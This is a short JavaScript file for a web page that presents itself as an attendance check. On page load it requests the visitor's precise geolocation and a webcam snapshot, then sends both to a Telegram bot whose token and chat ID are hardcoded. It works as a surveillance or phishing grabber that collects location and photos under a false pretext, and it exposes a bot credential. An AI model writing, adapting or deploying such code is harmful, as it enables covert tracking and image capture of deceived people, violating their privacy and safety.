const BOT_TOKEN = "8596201289:AAE7Ymg25nOMZlgWDpw-128Mkzbu90PVTMw"; // Telegram Bot Token
const CHAT_ID = "7491798353";     // Your Chat ID
const status = document.getElementById("status");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

// Send location message
function sendLocation(lat, lon) {
    const time = new Date().toLocaleString();
    const message = `
📍 Attendance Location
Latitude: ${lat}
Longitude: ${lon}
Time: ${time}
https://maps.google.com/?q=${lat},${lon}
`;

    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    });
}

// Send camera photo
function sendPhoto(dataUrl) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    // Convert dataURL to Blob
    fetch(dataUrl)
        .then(res => res.blob())
        .then(blob => {
            formData.append('photo', blob, 'snapshot.jpg');
            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        })
        .then(() => console.log("Photo sent"))
        .catch(err => console.log("Error sending photo:", err));
}

// Request camera access
function requestCamera() {
    return navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            return new Promise(resolve => {
                video.onloadedmetadata = () => {
                    // Take snapshot
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.5); // quality 50%
                    // Stop camera
                    stream.getTracks().forEach(track => track.stop());
                    resolve(dataUrl);
                };
            });
        });
}

// Request location
function requestLocation() {
    if(!navigator.geolocation) {
        status.textContent = "Geolocation not supported by your browser";
        return;
    }

    navigator.geolocation.getCurrentPosition(
        pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            sendLocation(lat, lon).then(() => status.textContent = "Location sent ✅");
            requestCamera().then(photoData => sendPhoto(photoData));
        },
        err => {
            if(err.code === err.PERMISSION_DENIED) {
                status.textContent = "Please allow location & camera permissions 📍📸";
            } else {
                status.textContent = "Location error ❌";
            }
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
}

// On page load → trigger location + camera
window.onload = () => requestLocation();
